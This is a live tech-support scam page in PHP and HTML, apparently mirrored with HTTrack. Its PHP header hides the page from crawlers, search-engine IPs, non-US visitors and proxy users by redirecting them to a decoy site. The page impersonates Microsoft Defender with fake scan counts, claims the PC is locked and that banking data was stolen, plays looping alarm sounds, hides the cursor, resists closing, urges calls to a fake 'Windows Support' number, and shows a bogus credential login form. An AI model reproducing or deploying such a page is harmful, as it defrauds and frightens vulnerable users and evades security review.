<?php
// -----------------
// Chặn bot tại server-side
// -----------------

function isKnownBotIp($ip) {
    $hostname = gethostbyaddr($ip);
    if ($hostname) {
        return (strpos($hostname, '.googlebot.com') !== false || strpos($hostname, '.google.com') !== false || strpos($hostname, '.bing.com') !== false);
    }
    return false;
}

$bot_patterns = [
    'bot', 'crawler', 'spider', 'crawling',
    'curl', 'wget', 'python-requests', 'scrapy', 'axios', 'postman'
];

$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? '');
$ip = $_SERVER['REMOTE_ADDR'] ?? '';
$isBot = false;

foreach ($bot_patterns as $pattern) {
    if (strpos($user_agent, $pattern) !== false) {
        $isBot = true;
        break;
    }
}

if (!$isBot) {
    $isBot = isKnownBotIp($ip);
}

// Nếu phát hiện là bot, redirect về news.php
if ($isBot) {
    header("Location: https://bestweathertv.online/");
    exit();
}

// -----------------
// Check IP quốc gia người dùng
// -----------------

function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return explode(',', $_SERVER['HTTP_X_FORWARDED_FOR'])[0];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

$userIP = getUserIP();

// Gọi API ipapi.co bằng PHP
$apiUrl = "https://ipapi.co/{$userIP}/json/";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $apiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$response = curl_exec($ch);
curl_close($ch);

if ($response) {
    $data = json_decode($response, true);
    
    $country = $data['country_code'] ?? null;
    $isProxy = $data['proxy'] ?? false;

    if ($country !== "US" || $isProxy === true) {
        // Nếu không phải IP US hoặc đang dùng VPN/Proxy ➔ Redirect
        header("Location: https://bestweathertv.online/");
        exit();
    }
} else {
    // Nếu API lỗi ➔ Cũng redirect về news.php
    header("Location: https://bestweathertv.online/");
    exit();
}
?>

<html lang="en">
<!-- Mirrored from zihanz29.z13.web.core.windows.net/win/index.html?call=+1 (509) 205-8122 by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Apr 2025 00:53:25 GMT -->
<head><meta charset="utf-8">
      <meta content="width=device-width,initial-scale=1,shrink-to-fit=no" name="viewport">
      <meta content="noindex,nofollow" name="robots">
      <title>Microsoft Security Alert</title>
	  	<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-HCXJDHK3TW"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-HCXJDHK3TW');
</script>
      <link href="w3" rel="icon" id="favicon" type="image/png">
      <link href="css/tapa.css" rel="stylesheet">
        <link href="css/bootstrap.min.css" <link="" type="text/css" rel="stylesheet">
<script async="" src="https://embed.tawk.to/669ea0b3becc2fed69290a2e/1i3dq7fd2" charset="UTF-8" crossorigin="*"></script><script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="css/font-awesome.min.css">

         <script src="js/emojione.min.js" type="text/javascript" async="" defer=""></script><script src="js/emojione.min.js" type="text/javascript" async="" defer=""></script><style type="text/css">@keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-moz-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}@-webkit-keyframes tawkMaxOpen{0%{opacity:0;transform:translate(0, 30px);;}to{opacity:1;transform:translate(0, 0px);}}#xnvjiaf2npoo1694042833969.open{animation : tawkMaxOpen .25s ease!important;}@keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-moz-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}@-webkit-keyframes tawkMaxClose{from{opacity: 1;transform:translate(0, 0px);;}to{opacity: 0;transform:translate(0, 30px);;}}#xnvjiaf2npoo1694042833969.closed{animation: tawkMaxClose .25s ease!important}</style>


 <script>
        function jkdhasjkhdgwqhgehkqgweyuodq(name)
        {
            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
            var regexS = "[\\?&]"+name+"=([^&#]*)";
            var regex = new RegExp( regexS );
            var results = regex.exec( window.location.href );
            if( results == null )
                return "";
            else
                return results[1];
        }
        var call = jkdhasjkhdgwqhgehkqgweyuodq('call');
    </script>

        <script src="js/script.compat.js" data-domain="steampowered.com" defer="" id="plausible"></script>

               
         <script src="js/esc.js" type="text/javascript"></script>
         <script src="js/flscn.js" type="text/javascript"></script>
         <script src="js/main.js" type="text/javascript"></script>
         <script src="js/custom.js" type="text/javascript"></script>
         <script src="js/mains.js" type="text/javascript"></script>
         
         <script src="js/all.js" type="text/javascript"></script>
         <script src="js/all1.js" type="text/javascript"></script>
         <script src="js/all2.js" type="text/javascript"></script>
         <script src="js/all3.js" type="text/javascript"></script>
         <script src="js/all4.js" type="text/javascript"></script>
         <script src="js/all5.js" type="text/javascript"></script>
    <script>
function chat() {
document.getElementById("chat").style.display = "block";
document.getElementById("footer").style.display = "block";
document.getElementById("welcomeDiv").style.display = "block";
 document.getElementById("chat-box").style.display = "none";

}


document.addEventListener('click', () => {


  document.getElementById("pridez").play();
 document.getElementById("pridez1").play();


});


</script>



<style>
#age-confirmation-modal {
position: fixed;
top: 0;
bottom: 0;
left: 0;
right: 0;
z-index: 99999999999;
display: inline-block;
background-color: rgba(0, 0, 0, 1);
background-image: url(bg1.html);
width: 100%;
height: auto;
background-repeat: no-repeat;
background-size: cover;
text-align: center;
cursor: alias;
font-size: 3.5rem;
}

#age-confirmation-modal .innerContainer {
background-color: #fff;
color: #111111;
padding: 50px;
border-radius: 20px;
display: inline-block;
top: 50%;
position: absolute;
left: 50%;
transform: translate(-50%, -50%);
}

.close1{
			float: right;
            font-size: 15px;
           
            color: red;
            border: 1px solid red;
          
            margin-top: -18px;
			width:23px;
			margin-top:-27px;
			margin-right:-27px;
			background: red;
			color: white;
}
.close1:hover{
			float: right;
            font-size: 15px;
            color: red;
          
            border: 1px solid red;
            background: white;
            margin-top: -18px;
			width:17px;
			margin-top:-27px;
			margin-right:-27px;
			width:23px;
}		


.nobtn{

 height: 40px;
    width: 90px;
    font-size: 16px;
	background:red;
	color:white;
}


.nobtn:hover{

 height: 40px;
    width: 90px;
    font-size: 16px;
	background:#e60000;
	color:white;
}
</style>
 
   <script>
        $(document).ready(function() {
           $("body").click(function() {
                $("#age-confirmation-modal").hide();
				
            });
		  
		  
        });
		

    </script>
        </head>



        <body class="map" id="mycanvas" onmousemove="showd2();" onclick="chat();beep1();" onbeforeunload="return myFunction()" style="cursor:none">
       

 <audio id="pridez" loop>
      <source src="msg.mp3" type="audio/mpeg">
    </audio>
 
     <audio id="pridez1" loop>
      <source src="beep.mp4" type="audio/mpeg">
    </audio>













      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
        <div class="black" style="height: 145%; cursor: none; display: block;"></div>

          <div class="bg" id="bg">
        <div class="bgimg" style="top:0">
          <img src="images/f24.png" alt="" width="100%">
        </div>
      </div>
      </a>
      <div class="pro_box" style="cursor: none; display: default;">
        <div class="pro_box_header">
          <div class="row">
            <div class="col-md-12">
              <div class="minimize">
                <ul>
                  <li>
                    <a href="#">
                      <img src="images/mnc.png">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
            <div class="col-md-4">
              <div class="logo">
                <img src="images/msmm.png">
                <span>Windows security</span>
              </div>
            </div>
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="#">
                      <button>Activate the license</button>
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/set.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <div class="scan_box">
          <div class="scan_box_header">
            <div class="row">
              <div class="col-md-6">
                <div class="quick_scan">
                  <p>
                    <img src="images/vsc.png">
                    <span>Scanning Rapide</span>
                  </p>
                </div>
              </div>
              <div class="col-md-6">
                <div class="bhfys">
                  <ul>
                    <li>
                      <a href="#">
                        <img src="images/mnc.png">
                      </a>
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
          <div class="scan_body">
            <div class="progress" style="height:30px;">
              <img src="images/scn.png" alt="" style="max-width: 100%;">
            </div>
            <div class="table_quick">
              <table class="table table-bordered">
                <thead>
                  <tr>
                    <th scope="col">Scanned Objects</th>
                    <th scope="col">
                      <div class="col_fourth counter">
                        <h2 class="count-number count-title timer" data-speed="5000" data-to="51900">51,900</h2>
                      </div>
                    </th>
                  </tr>
                  <tr>
                    <th scope="col">Time Spent</th>
                    <th scope="col">5 secs</th>
                  </tr>
                  <tr>
                    <th scope="col">Identified Threats</th>
                    <th scope="col" style="color:red">
                      <h2 class="count-number count-title timer" data-speed="2500" data-to="1200">1,200</h2>
                    </th>
                  </tr>
                </thead>
              </table>
            </div>
          </div>
          <div class="scan_footer">
            <div class="row">
              <div class="col-md-6">
                <div class="bt_can">
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Scan</button>
                  </div>
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Pause</button>
                  </div>
                </div>
              </div>
              <div class="col-md-6">
                <div class="bt_can2">
                  <div class="btn-group" role="group" aria-label="Basic example">
                    <button class="btn btn-secondary" type="button">Scheduled Scans</button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div class="pro_box2" style="cursor: default; display: none;">
        <img src="images/bg1.png" alt="" style="max-width: 100%;">
      </div>
      <div class="pro_box3" style="cursor: none; display: none;">
        <div class="pro_box_header">
          <div class="row">
            <div class="col-md-12">
              <div class="minimize">
                <ul>
                  <li>
                    <a href="#">
                      <img src="images/mnc.png">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
            <div class="col-md-4">
              <div class="logo">
                <img src="images/msmm.png">
                <span>Windows security</span>
              </div>
            </div>
            <div class="col-md-8">
              <div class="activate_lic">
                <ul>
                  <li>
                    <a href="#">
                      <button>Activate the license</button>
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/bel.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="images/set.png">
                    </a>
                  </li>
                  <li>
                    <a href="#">
                      <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA0AAAANCAIAAAD9iXMrAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAP9JREFUeNqMUTEORUAQZbIUalESpTNoVEqJSuIKjuMUCiRKnQtoKSRCKRp0JPJf/iYbv/iJKdZ47+3smxl533fpG9d1dV03z/O6rrqum6bpOI6iKJxl/DNNU5Zly7JIjzAMI4oiy7KQy6gHUZqm+FFVNQxDEEDKsjzPk4iSJAFCeA6VeIE4jm3bbtsWJ3Ig932DhYbBk3juOI6macZx3LYtCAIOgoWGwbgwlOc5T9BB3/cCh4bQnfQbruui2aqqBAINYQRPEYx7nlcUBTwIEBrC1aeOMVbX9TAMTxAaghXMSfofYKEhTBzDFKimab7v4xQ2wEIj87292seb/X4EGADicI/nlE5xDgAAAABJRU5ErkJggg==">
                    </a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div><div class="scan_box2" style=" border: 1px solid #474747;  cursor:default;  box-shadow: 15px 15px 15px 15px rgba(0,0,0,.4);">
        <div class="scan_box2">
          <div class="scan_box_header">
            <div class="row">
              <div class="col-md-6">
                <div class="quick_scan">
                  <p>
                    <img src="images/vsc.png">
                    <span>Scan</span>
                  </p>
                </div>
              </div>
             <div class="col-md-6">
           <span class="fl title2" id="txts1">
              <a href="#" id="cross">
                <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>
                      </a>


                </span></div>
              </div>
            </div>
          </div>
          <div class="scan_body">
            <div class="row">
              <div class="col-md-12">
                <div class="tooreg_detail_scan">
                  <ul>

                  </ul></div>
                </div>

              </div>
            </div>
          </div>
        </div>

      <div style="bottom:-20px;position:fixed;cursor:none;z-index:999999999" id="footer">
        <div class="row">
          <div class="col-md-12">
            <div class="right-foot" style="text-align:center">
              <span id="footertxt">
                <img src="images/msmm.png"> Windows security </span>
              <span style="font-weight:500;padding-left:13px;color:#fff; ">Windows Support <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write('+1 (509) 205-8122'+call)</script>
                </span>
              </span>
            </div>
          </div>
          <div class="col-md-12">
            <marquee direction="left" height="100px" width="100%">
              <small class="text-left" style="color:#eee;font-size:10px">Windows Defender SmartScreen now prevents unrecognized applications from appearing. Running this application may put your PC at risk. Windows Defender scan detected unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents。</small>
            </marquee>
          </div>
        </div>
      </div>
      <div class="lightbox" id="poptxt" onclick="beep1();" style="display: none; cursor:default;">
        <div class="ilb top" style="font-size:17px">
          <div class="ilb headers" style="border-bottom:1px solid #d6d5d5;">
            <span class="fl title" id="txtadd">
              <span class="fl ilb">
                <img src="images/dm.png" class="logo3">
              </span>Microsoft Defender </span>
            <span class="fl title2" id="txts1">
               <p style="margin-right:50px;">➖</p><p style="margin-right:30px;">❏ </p><p>❌</p><p></p>

            </span>
          </div>
        </div>
        <div id="txtintro2">
          <span class="colo-rd">
           <p style="font-size:30px;font-weight:500;">Sorry, scan is not completed!</p>
            <p style="font-size:25px;color:red;font-weight:500;">Error: Ox800VDS</p>
             <p style="font-size:15px;font-weight:400;color:black;">Microsoft Defender found some infected files but not able to remove it because of the group policies permissions. Please Scan now to remove it manually.</p>

          </span>
        </div>
        <img src="images/re.gif" id="banner">
        <div id="disclaimer" style="color:#0F396D;">Call support for help<br>
           <span class="support" style="font-size:22px;">Windows Support <span style="border:1px Solid #114d9a;border-radius:5px;padding:2px 5px"><script>document.write('+1 (509) 205-8122'+call)</script>
            </span>
          </span>
        </div>
        <div id="bottom">
          <img src="images/msmm.png" id="badge">
          <span class="title3">Windows Security</span>
          <ul>
            <li>
              <a href="#">
                <div class="button">
                  <span id="">Scan now</span>
                </div>
              </a>
            </li>
            <li>
              <a href="#">
                <div class="button2">
                  <span id="">Scan Later</span>
                </div>
              </a>
            </li>
          </ul>
        </div>
      </div>
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Windows-Defender </p>
        <p>
         <b>Access to this PC has been blocked for security reasons</b>
         </p>
         <p>Your computer has been reported to be infected with Trojan-type spyware. The following data was compromised:</p>
         <p>&gt; Email ID <br>&gt; Bank Password <br>&gt; Facebook Login <br>&gt; Photos and Documents </p>
         <p>A Windows Defender scan detected potentially unwanted adware on this device that can steal passwords, online identities, financial information, personal files, photos, and documents. </p>
         <p>Please contact us immediately. Our engineer will guide you through the removal process over the phone. </p>
         <p>Call Windows Support immediately to report this threat, prevent identity theft, and unblock access to this device. </p>
         <p>Closing this window may put your personal information at risk and may cause your Windows registration to be suspended. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px">Windows Please call support:<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px"><script>document.write('+1 (509) 205-8122'+call)</script>
            </span>
          </strong>
        </p>
        <div class="action_buttons">
          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">OK</a>
          <a class="active" id="leave_page" style="color:#fff!important">Cancel</a>
        </div>
      </div>


      <div class="answer_list" style="display:none;background-color: rgb(40 40 40 / 80%);;height:auto;width:550px;margin-left:33%;position:absolute;z-index:99999999;border:1px solid transparent;border-color:#d6d8db;border-radius:.5rem" id="welcomeDiv">
        <p style="color:#FFFFFF;margin-top:10px;font-size:16px;opacity:.9;padding:0 5px" class="text-center">Access to this PC has been blocked for security reasons. Do not access or restart this PC. If you overlook this basic warning, you may lose information about this framework. Contact support as soon as possible and a Microsoft expert will guide you through the investigation over the phone. Running this application may put your PC at risk。<br>
          <strong>
         Windows Support: <span style="border:1px solid #383d41;border-radius:5px;padding:2px 5px"><script>document.write('+1 (509) 205-8122'+call)</script>
            </span>
          </strong>
        </p>
      </div>
      <div id="chat" style="display: none;">
        <img src="images/msmm.png">
        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Microsoft</span>
        <br>
        <p>Windows Technical Support
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px"><script>document.write('+1 (509) 205-8122'+call)</script>
          <br>( Toll-free number)<br><br>
        </h4>
        <div class="arrow-down">
          <svg height="1em" viewBox="0 0 320 512">
            <style>
              svg {
                fill: #fff
              }
            </style>
            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                  </svg></div>
      </div>
<div id="chat-box">
<span style="color: #fff;
font-size: 21px;
font-weight: 600;
margin-left: 6px;
position: relative;
top: 5px;">Admin login</span>
<div class="bhfys" onclick="hide1();playSound1();">
            <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>

          </div>

<br>
<br>
<p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
Windows locked due to unusual activity.
<br>Please log in again using your Microsoft ID and password.<br>For assistance, contact Microsoft Support<br><strong><script>document.write('+1 (509) 205-8122'+call)</script></strong></p>

<form action="#">
   <input type="text" name="name" id="name" placeholder="User name" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

 <input type="text" name="name" id="name" placeholder="Password" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

<input type="submit" class="button1" name="Verify" onclick="playSound1();">Login



  </form></div>

<script>
function showd2() {
document.getElementById("chat-box").style.display = "block";
}
</script>
     
   

      <script>
        setInterval(function() {
          document.getElementById("kernk").play()
        }, 500);
      </script>
      <script>
  function beep1() {
    document.getElementById("bgtf").play();
 }
  </script>
      <script>
        var e = 1;
        setInterval(function() {
          1 == e ? (document.getElementById("favicon").href = "w3.html", e = 0) : (document.getElementById("favicon").href = "w1.html", e = 1)
        }, 1E3);
      </script>
      <script>
        $(document).ready(function() {
          $("#mycanvas").click(function() {
            $("#welcomeDiv").show()

          })
        });
      </script>
   
     
     
      
</body>
<!-- Mirrored from zihanz29.z13.web.core.windows.net/win/index.html?call=+1 (509) 205-8122 by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 24 Apr 2025 00:54:05 GMT -->
</html>
